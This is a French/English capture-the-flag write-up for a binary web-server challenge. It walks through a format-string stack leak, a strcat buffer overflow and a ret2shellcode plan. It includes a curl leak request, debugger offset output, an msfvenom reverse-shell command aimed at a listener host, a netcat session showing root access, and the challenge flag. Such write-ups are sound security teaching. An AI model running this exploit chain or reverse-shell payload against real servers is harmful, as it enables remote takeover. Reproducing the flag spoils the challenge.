# Empire Server

## Write-up FR

Nous avons un binaire et une URL. Si nous visitons l'URL, nous voyons qu'on a accès aux endpoints `/` et `/login`. Rien de très intéressant pour l'instant, donc nous allons analyser le binaire.
Tout d'abord, on remarque que c'est un binaire ELF x86_64 avec PIE, pas de stack canary, et pas de NX. En analysant le binaire, on découvre que lorsqu'on tente de se connecter via une requête `POST` sur `/login`, la fonction `iterate_post` est appelée, laquelle copie notre `username` dans une variable de taille `50` octets et notre `password` dans une variable de taille `300` octets :
```c
undefined8 iterate_post(long param_1,undefined8 param_2,char *param_3)

{
  int iVar1;
  char *param_7;
  ulong param_9;
  
  iVar1 = strcmp(param_3,"user");
  if (iVar1 == 0) {
    if ((param_9 == 0) || (0x32 < param_9)) {
      *(undefined *)(param_1 + 4) = 0;
    }
    else {
      snprintf((char *)(param_1 + 4),0x32,param_7); //username
    }
  }
  else {
    iVar1 = strcmp(param_3,"password");
    if (iVar1 == 0) {
      if ((param_9 == 0) || (300 < param_9)) {
        *(undefined *)(param_1 + 0x36) = 0;
      }
      else {
        snprintf((char *)(param_1 + 0x36),300,param_7); //password
      }
    }
  }
  return 1;
}
```
Une fois ces valeurs récupérées, la fonction `verify_account` est appelée. Cette fonction vérifie que nous avons les bons inputs en concaténant notre `username` et `password` dans un buffer de taille `208`. Cependant, comme le `username` peut contenir jusqu'à `50` octets et le password jusqu'à `300` octets, on a un buffer overlow : 
```c
undefined8 verify_account(char *param_1,char *param_2)

{
  size_t sVar1;
  undefined8 uVar2;
  uint local_128 [16];
  char local_e8 [208];
  char *local_18;
  int local_c;
  
  ...

  local_18 = "IloveMyServer";
  strcpy(local_e8,param_1);
  strcat(local_e8,param_2);//buffer overflow
  sVar1 = strlen(local_e8);
  if (sVar1 == 0xd) {
    for (local_c = 0; local_c < 0xd; local_c = local_c + 1) {
      if (((int)local_e8[local_c] ^ local_128[local_c]) != (int)local_18[local_c]) {
        return 0xffffffff;
      }
    }
    uVar2 = 0;
  }
  else {
    uVar2 = 0xffffffff;
  }
  return uVar2;
}
```
Cela nous permet de réaliser un exploit de type `ret2shellcode`. Cependant, il y a un problème : l'ASLR est activé, donc nous avons besoin d'un leak.
En regardant la fonction `post_response`, on voit que si les identifiants sont incorrects, elle effectue un `snprintf` de notre `username` dans la page qui nous est renvoyée. Comme il n'y a pas d'arguments de format, nous avons une vulnérabilité de type `format string` qui nous permet de leak une adresse de la stack :
```bash
curl -X POST -d "user=%25p&password=admin" http://localhost:9999/login
<!DOCTYPE html><html lang="fr"><body><div><h1>Erreur de connexion pour <span style="color:red;">0x71473c01a5a4</span></h1><p>Invalide login/password</p></div></body></html>
```

Nous allons donc dans un premier temps déterminer l'offset pour contrôler `rip` : 
```bash
pwndbg> b *verify_account+335
Breakpoint 1 at 0x1995
pwndbg> run
...
POST /login ok Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj
...
RSP  0x7ffff75ff508 ◂— push 0x38684137 /* 0x4138684137684136; '6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj' */
 RIP  0x555555555995 (verify_account+335) ◂— ret 
────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────
 ► 0x555555555995 <verify_account+335>    ret                                <0x4138684137684136>
```
Nous voyons qu'avec 230 octets, nous contrôlons le `rip`.
Ensuite, nous déterminons où sauter. Comme il y a beaucoup de place dans `local_e8` (username+password), nous allons sauter dessus. Nous devons juste trouver une adresse dans la stack qui nous permet de calculer l'adresse de `local_e8`. Après quelques recherches, nous voyons qu'avec `%94$p` comme `username`, nous obtenons une adresse dans la stack qui est toujours à `+1008` octets de `local_e8`. 
Notre exploit consiste donc en :

Première requête :
- Fuite de la stack avec `user=%94$p&password=a`

Deuxième requête :
- username = 'ok'
- password = shellcode + 'a'*(230-size(shellcode)) + ret_leak_addr + 2 (+ 2 pour sauter le 'ok')

Pour créer notre shellcode, nous utilisons `msfvenom` pour générer un reverse shell en x64. De plus, comme nous passons par HTTP, nous devons éviter les caractères `\x00`, `\x0d` et `\x0a`:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.15 LPORT=4444 -b "\x00\x0d\x0a" -f py -o shellcode.txt
```

On lance `netcat` en écoute sur un terminal :
```bash
$ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.17.0.2 43064
whoami
root
```
Puis sur un autre terminal :
```bash
python sol.py 
buffer addr :  0x769ffc7ff420
```

## Write-up EN
We have a binary and a URL. If we visit the URL, we can see that we have access to the `/` and `/login` endpoints. Nothing interesting for now, so let's take a look at the binary.

First, we see that it's an ELF x86_64 binary with PIE, no stack canary, and no NX. Analyzing the binary, we discover that when we attempt to log in via a `POST` request to `/login`, it calls the `iterate_post` function, which copies our `username` into a `50-byte` variable and our `password` into a `300-byte` variable :
```c
undefined8 iterate_post(long param_1,undefined8 param_2,char *param_3)

{
  int iVar1;
  char *param_7;
  ulong param_9;
  
  iVar1 = strcmp(param_3,"user");
  if (iVar1 == 0) {
    if ((param_9 == 0) || (0x32 < param_9)) {
      *(undefined *)(param_1 + 4) = 0;
    }
    else {
      snprintf((char *)(param_1 + 4),0x32,param_7); //username
    }
  }
  else {
    iVar1 = strcmp(param_3,"password");
    if (iVar1 == 0) {
      if ((param_9 == 0) || (300 < param_9)) {
        *(undefined *)(param_1 + 0x36) = 0;
      }
      else {
        snprintf((char *)(param_1 + 0x36),300,param_7); //password
      }
    }
  }
  return 1;
}
```
Once these values are gathered, the `verify_account` function is called. This function checks that we have the correct input by concatenating our `username` and `password` into a `208-byte` buffer. However, since `username` can hold `50` bytes and `password` can hold `300` bytes, there is a `buffer overflow` :
```c
undefined8 verify_account(char *param_1,char *param_2)

{
  size_t sVar1;
  undefined8 uVar2;
  uint local_128 [16];
  char local_e8 [208];
  char *local_18;
  int local_c;
  
  ...

  local_18 = "IloveMyServer";
  strcpy(local_e8,param_1);
  strcat(local_e8,param_2);//buffer overflow
  sVar1 = strlen(local_e8);
  if (sVar1 == 0xd) {
    for (local_c = 0; local_c < 0xd; local_c = local_c + 1) {
      if (((int)local_e8[local_c] ^ local_128[local_c]) != (int)local_18[local_c]) {
        return 0xffffffff;
      }
    }
    uVar2 = 0;
  }
  else {
    uVar2 = 0xffffffff;
  }
  return uVar2;
}
```
This leads to a `ret2shellcode` exploit. However, there's a problem: ASLR is enabled, so we need a leak.
By examining the `post_response` function, we notice that if the login credentials are incorrect, it does a `snprintf` of our username into the page returned to us. Since there are no format arguments, we have a `format string` vulnerability that allows us to leak an address from the stack :
```bash
curl -X POST -d "user=%25p&password=admin" http://localhost:9999/login
<!DOCTYPE html><html lang="fr"><body><div><h1>Erreur de connexion pour <span style="color:red;">0x71473c01a5a4</span></h1><p>Invalide login/password</p></div></body></html>
```
Now, we first determine the offset to control `rip` :
```bash
pwndbg> b *verify_account+335
Breakpoint 1 at 0x1995
pwndbg> run
...
POST /login ok Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj
...
RSP  0x7ffff75ff508 ◂— push 0x38684137 /* 0x4138684137684136; '6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj' */
 RIP  0x555555555995 (verify_account+335) ◂— ret 
────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────
 ► 0x555555555995 <verify_account+335>    ret                                <0x4138684137684136>
```
We can see that with `230` bytes, we control `rip`.
Next, we determine where to jump. Since there is plenty of space in `local_e8` (username+password), we will jump to it. We just need to find an address in the stack that will help us calculate the address of `local_e8`. After some searching, we find that using `%94$p` as the username gives us a stack address that is always `+1008` bytes from `local_e8`.
Our exploit consists of :

First request
- Leak stack with user=%94$p&password=a

Second request:
- username = 'ok'
- password = shellcode + 'a'*(230-size(shellcode)) + ret_leak_addr + 2 (+ 2 to skip the 'ok')

To craft our shellcode, we use `msfvenom` to generate a reverse shell in x64. Additionally, since we are using HTTP, we avoid the characters `\x00`, `\x0d`, and `\x0a`:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.15 LPORT=4444 -b "\x00\x0d\x0a" -f py -o shellcode.txt
```
We then run netcat to listen on one terminal and execute the exploit on the other :
```bash
$ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.17.0.2 43064
whoami
root
```
```bash
python sol.py 
buffer addr :  0x769ffc7ff420
```
## Flag

`polycyber{L3t_th3_R3pUbl1c_b3g1n!}`